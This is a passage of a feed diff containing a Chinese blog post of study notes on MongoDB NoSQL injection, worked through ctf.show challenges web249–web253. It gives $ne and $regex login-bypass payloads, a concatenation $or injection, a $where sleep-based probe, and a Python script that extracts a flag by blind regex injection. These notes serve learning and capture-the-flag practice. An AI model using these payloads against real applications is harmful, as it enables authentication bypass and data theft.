-&lt;td style=&#34;text-align:left&#34;&gt;7&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;Boolean&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;8&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;Date&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;9&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;Null&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;10&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;Regular Expression&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;11&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;JavaScript&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;13&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;Symbol&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;14&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;JavaScript (with scope)&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;15&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;32-bit integer&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;16&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;Timestamp&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;17&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;64-bit integer&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;18&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;Min key&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;255&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;Query with  &lt;code&gt;-1&lt;/code&gt; .&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;Max key&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;127&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;p&gt;有关 mongodb 更多语法还请移步菜鸟教程&lt;/p&gt;
-&lt;h2 id=&#34;nosql注入分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nosql注入分类&#34;&gt;#&lt;/a&gt; nosql 注入分类&lt;/h2&gt;
-&lt;p&gt;这里我在各个博客中找到了两种对 nosql 注入的分类&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;第一种，按照攻击手法分类&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;重言式&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;也称为 “永真式”，这类攻击是在条件语句中注入代码使得生成的结果为永真，绕过判断机制&lt;/li&gt;
-&lt;/ol&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;联合查询&lt;/p&gt;
-&lt;p&gt;一样和传统数据库常用的 sql 注入的方法&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;javaScript 注入&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;这种漏洞是由于允许执行数据内容的 Nosql 数据库引入的，构造攻击语句通过 js 输入到查询中，从而导致数据被非法获取或者篡改&lt;/li&gt;
-&lt;/ol&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;盲注&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;没有回显时使用的一种注入方式&lt;/li&gt;
-&lt;/ol&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;背负式查询&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;通过转义字符插入数据库进行额外的查询，进而执行任意代码&lt;/li&gt;
-&lt;/ol&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;跨域违规&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;这里产生漏洞的是 HTTP REST APls（一个实现对数据库进行访问和管理的接口协议）它甚至可以让攻击者从其他域攻击数据库。在跨域工具中，攻击者利用合法用户和他们的网页浏览器执行有害操作&lt;/li&gt;
-&lt;/ol&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;第二种，按照语言的分类&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;php 数组注入&lt;/li&gt;
-&lt;li&gt;js 注入&lt;/li&gt;
-&lt;li&gt;monggoshell 拼接注入&lt;/li&gt;
-&lt;/ol&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;这里主要记录第一种分类的学习&lt;/p&gt;
-&lt;h2 id=&#34;重言式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#重言式&#34;&gt;#&lt;/a&gt; 重言式&lt;/h2&gt;
-&lt;h3 id=&#34;web249&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web249&#34;&gt;#&lt;/a&gt; web249&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301133004913.png&#34; alt=&#34;image-20230301133004913&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这里提示了 flag 在 flag 里，id 这里对输入进行了校验&lt;br /&gt;
- y4 师傅说这题后端对 id 过滤了非数字，可能用的 intval 函数。这里使用数组绕过即可&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301133158297.png&#34; alt=&#34;image-20230301133158297&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这个感觉不算是考察 nosql？？&lt;/p&gt;
-&lt;h3 id=&#34;web250&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web250&#34;&gt;#&lt;/a&gt; web250&lt;/h3&gt;
-&lt;p&gt;这个题利用 nosql 的一个小特性即可&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301133529499.png&#34; alt=&#34;image-20230301133529499&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这里有提示说没有任何过滤，利用 $ne 就可以了&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301135349643.png&#34; alt=&#34;image-20230301135349643&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;在上面有提到过这个 $ne 在 nosql 中就是不等于，这里传入的 username 和 password 就是传入的数据，他判断用户名和密码是否正确，这里通过使用 $ne 构造永真绕过判断，类似 sql 注入里的 or 1=1, 这就是上面提到的重言式注入&lt;/p&gt;
-&lt;h3 id=&#34;web251&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web251&#34;&gt;#&lt;/a&gt; web251&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301135843329.png&#34; alt=&#34;image-20230301135843329&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这里发现好像没改什么，也提示说无过滤，还是先用上面的 payload 尝试&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301140017356.png&#34; alt=&#34;image-20230301140017356&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;也利用成功了，但是这里是给了账号密码，尝试登录也没什么新的东西，想到这里可能是只查询一条数据，这里使得 username 为 flag 可以找到 flag&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301140301944.png&#34; alt=&#34;image-20230301140301944&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;看到师傅们还可以使用正则&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;username[$regex]=.*&amp;amp;password[$regex]=.*
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301140533852.png&#34; alt=&#34;image-20230301140533852&#34; /&gt;&lt;/p&gt;
-&lt;h3 id=&#34;web252&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web252&#34;&gt;#&lt;/a&gt; web252&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301163101109.png&#34; alt=&#34;image-20230301163101109&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这一题有点变化，但是没啥影响，这个 pretty () 方法的作用是使得查询出来的数据在命令行中更加美观的显示，不至于太紧凑。&lt;/p&gt;
-&lt;p&gt;用前面的永真测试&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301163248398.png&#34; alt=&#34;image-20230301163248398&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;和上面一样，第一条没有 flag 尝试直接读 flag&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301163351837.png&#34; alt=&#34;image-20230301163351837&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;也是失败的，尝试跳过 admin，但是还有 admin1&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301163457769.png&#34; alt=&#34;image-20230301163457769&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这里要用到前面的正则&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;username[$regex]=^[^a].*$&amp;amp;password[$ne]=1
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301163637992.png&#34; alt=&#34;image-20230301163637992&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;联合查询&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#联合查询&#34;&gt;#&lt;/a&gt; 联合查询&lt;/h2&gt;
-&lt;p&gt;前面有提到，mongodb 使用的是 json 的查询结构，json 对字符串的拼接也有着类似传统 sql 注入的地方&lt;/p&gt;
-&lt;p&gt;例：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;string query =&amp;quot;&amp;#123; username: &#39;&amp;quot; + $username + &amp;quot;&#39;, password: &#39;&amp;quot; + $password + &amp;quot;&#39; &amp;#125;&amp;quot;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;当用户输入用户名和密码后，这里如果对用户输入的校验不足&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;&amp;#123;&#39;username&#39;:&#39;admin&#39;, &#39;password&#39;:&#39;123456&#39;&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;就可以构造 payload：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;username=admin&#39;, $or: [ &amp;#123;&amp;#125;, &amp;#123;&#39;a&#39;: &#39;a&amp;amp;password=&#39; &amp;#125;], $comment: &#39;123456
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;拼接后相当于是执行了&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;&amp;#123; username: &#39;admin&#39;, $or: [ &amp;#123;&amp;#125;, &amp;#123;&#39;a&#39;:&#39;a&#39;, password: &#39;&#39; &amp;#125;], $comment: &#39;123456&#39;&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这个就类似&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;select * from logins where username = &#39;admin&#39; and (password true&amp;lt;&amp;gt; or (&#39;a&#39;=&#39;a&#39; and password = &#39;&#39;))
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&#34;js注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#js注入&#34;&gt;#&lt;/a&gt; js 注入&lt;/h2&gt;
-&lt;p&gt;攻击者通过构造恶意的查询语句，利用 NoSQL 数据库的查询语句中可执行 JavaScript 代码的特性，来获取敏感信息或实现远程执行等攻击&lt;/p&gt;
-&lt;p&gt;在 NoSQL 数据库中，由于查询语句中允许执行 JavaScript 代码，因此攻击者可以在查询语句中注入恶意的 JavaScript 代码，从而获取敏感信息。例如，攻击者可以通过构造恶意的查询语句来绕过登录验证，获取管理员权限。同时，攻击者还可以利用查询语句中执行 JavaScript 代码的特性来实现远程执行攻击，例如在服务器上执行任意的系统命令，导致服务器被入侵控制等。&lt;/p&gt;
-&lt;h3 id=&#34;where操作符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#where操作符&#34;&gt;#&lt;/a&gt; $where 操作符&lt;/h3&gt;
-&lt;p&gt;$where 操作符是 MongoDB 中的一种查询语句，可以用于执行自定义的 JavaScript 表达式，并返回符合条件的文档。&lt;/p&gt;
-&lt;p&gt;在 MongoDB 中，可以使用 $where 操作符在集合中进行查询，示例代码如下：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;db.collection.find( &amp;#123; $where: function() &amp;#123; return this.field1 == this.field2; &amp;#125; &amp;#125; )
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;在这个例子中，$where 操作符的参数是一个 JavaScript 函数，函数体内使用了 MongoDB 的 JavaScript Shell 中的 this 变量，指代了当前文档对象。函数体中的表达式用于检查文档中的某些字段是否相等，如果相等，则返回该文档。&lt;/p&gt;
-&lt;p&gt;需要注意的是，使用 $where 操作符需要在查询中执行 JavaScript 代码，因此性能可能会较差，不建议在大数据量的环境中使用。此外，由于 JavaScript 语言的灵活性，$where 查询可能存在安全风险，攻击者可以通过构造恶意代码实现注入攻击，因此需要谨慎使用。&lt;/p&gt;
-&lt;p&gt;通常情况下，应该优先选择 MongoDB 提供的其他查询语句，比如 $eq、$ne、$in 等操作符，这些操作符可以更高效地执行查询，并且不会引入安全风险。只有在特定的场景下，才需要使用 $where 操作符进行高度定制化的查询。&lt;/p&gt;
-&lt;p&gt;如下实例：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;&amp;gt; db.users.find(&amp;#123; $where: &amp;quot;function()&amp;#123;return(this.username == &#39;whoami&#39;)&amp;#125;&amp;quot; &amp;#125;)
-&amp;#123; &amp;quot;_id&amp;quot; : ObjectId(&amp;quot;60fa9c80257f18542b68c4b9&amp;quot;), &amp;quot;username&amp;quot; : &amp;quot;whoami&amp;quot;, &amp;quot;password&amp;quot; : &amp;quot;657260&amp;quot; &amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;由于使用了  &lt;code&gt;$where&lt;/code&gt;  关键字，其后面的 JavaScript 将会被执行并返回 &amp;quot;whoami&amp;quot;，然后将查询出 username 为 whoami 的数据。&lt;/p&gt;
-&lt;p&gt;某些易受攻击的 PHP 应用程序在构建 MongoDB 查询时可能会直接插入未经过处理的用户输入，例如从变量中  &lt;code&gt;$userData&lt;/code&gt;  获取查询条件：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;db.users.find(&amp;#123; $where: &amp;quot;function()&amp;#123;return(this.username == $userData)&amp;#125;&amp;quot; &amp;#125;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;然后，攻击者可能会注入一种恶意的字符串如  &lt;code&gt;&#39;a&#39;; sleep(5000)&lt;/code&gt;  ，此时 MongoDB 执行的查询语句为：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;db.users.find(&amp;#123; $where: &amp;quot;function()&amp;#123;return(this.username == &#39;a&#39;; sleep(5000))&amp;#125;&amp;quot; &amp;#125;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;如果此时服务器有 5 秒钟的延迟则说明注入成功。&lt;/p&gt;
-&lt;p&gt;以下是一个简单的示例，假设一个应用使用 MongoDB 作为数据库，有一个用户登录的验证过程：&lt;/p&gt;
-&lt;figure class=&#34;highlight js&#34;&gt;&lt;figcaption data-lang=&#34;JavaScript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; username &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; req&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;body&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; password &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; req&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;body&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;password&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; query &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token literal-property property&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token literal-property property&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; password &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;db&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;users&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;find&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;query&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token parameter&#34;&gt;err&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; result&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;err&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;throw&lt;/span&gt; err&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;result&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;length &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Login success&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Login failed&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;在这个过程中，黑客可以通过构造特定的 JavaScript 代码来注入恶意脚本，例如将 password 参数设置为以下内容：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;&amp;#123; $ne: &#39;1&#39; &amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这个语句会使得 MongoDB 查询语句的结果永远为真，从而可以成功绕过登录验证。&lt;/p&gt;
-&lt;h2 id=&#34;盲注&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#盲注&#34;&gt;#&lt;/a&gt; 盲注&lt;/h2&gt;
-&lt;h3 id=&#34;web253&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web253&#34;&gt;#&lt;/a&gt; web253&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301163922915.png&#34; alt=&#34;image-20230301163922915&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;还是没啥改变，继续用前面的测试&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301163959772.png&#34; alt=&#34;image-20230301163959772&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这里测试发现登录成功，但是没有回显了，那肯定就是盲注咯&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-# author： Clown
-# datetime： 2023/3/1 16:49 
-# ide： PyCharm
-import requests
-
-url = &amp;quot;http://65083bf6-7c9c-4c55-ba15-aa555b4df664.challenge.ctf.show/api/&amp;quot;
-proxies=&amp;#123;&#39;http&#39;:&#39;http://127.0.0.1:8080&#39;,&#39;https&#39;:&#39;https://127.0.0.1:8080&#39;&amp;#125;
-headers = &amp;#123;
-    &amp;quot;Content-Type&amp;quot;:&amp;quot;application/x-www-form-urlencoded&amp;quot;
-&amp;#125;
-flag=&amp;quot;&amp;quot;
-
-for i in range(100):
-    for ch in &amp;quot;&amp;#123;-abcdefghijklmnopqrstuvwxyz0123456789&amp;#125;&amp;quot;:
-        payload = &amp;quot;^&amp;#123;&amp;#125;.*$&amp;quot;.format(flag+ch)
-        data = &amp;quot;username[$regex]=flag&amp;amp;password[$regex]=&amp;quot;+payload
-        #print(data)
-        r = requests.post(url=url,data=data,proxies=proxies,headers=headers)
-        #print(r.text)
-        if r&amp;quot;\u767b\u9646\u6210\u529f&amp;quot; in r.text:
-            flag=flag+ch
-            print(flag)
-            if ch==&amp;quot;&amp;#125;&amp;quot;:
-                exit()
-            break
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301175801860.png&#34; alt=&#34;image-20230301175801860&#34; /&gt;&lt;/p&gt;
-</content>
-        <category term="Web" scheme="https://blog.xcu.icu/categories/Web/" />
-        <category term="nosql" scheme="https://blog.xcu.icu/tags/nosql/" />
-        <updated>2023-03-01T04:00:00.000Z</updated>
     </entry>
 </feed>
